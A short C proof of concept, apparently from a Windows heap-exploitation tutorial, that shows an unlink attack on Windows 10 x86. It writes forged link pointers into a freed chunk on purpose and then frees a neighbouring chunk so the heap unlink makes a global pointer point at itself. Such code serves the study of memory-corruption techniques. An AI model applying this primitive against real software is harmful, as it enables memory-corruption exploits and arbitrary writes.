// http://blog.eonew.cn/archives/1216
// tested on windows 10 x86
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char* ptr[0x10];

// 其作用就是让ptr[2]指针指向自己
int main()
{
    HANDLE heap = HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000);
    setbuf(stdout, NULL);
    ptr[0] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
    ptr[1] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
    ptr[2] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
    ptr[3] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
    ptr[4] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
    ptr[5] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
    HeapFree(heap, HEAP_NO_SERIALIZE, ptr[2]);
    HeapFree(heap, HEAP_NO_SERIALIZE, ptr[4]);
    *(void**)(ptr[2]) = &ptr[2] - 1;
    *(void**)(ptr[2] + 4) = &ptr[2];
    printf("%p: %p\n", &ptr[2], ptr[2]);
    HeapFree(heap, HEAP_NO_SERIALIZE, ptr[1]);
    printf("%p: %p\n", &ptr[2], ptr[2]);
    return 0;
}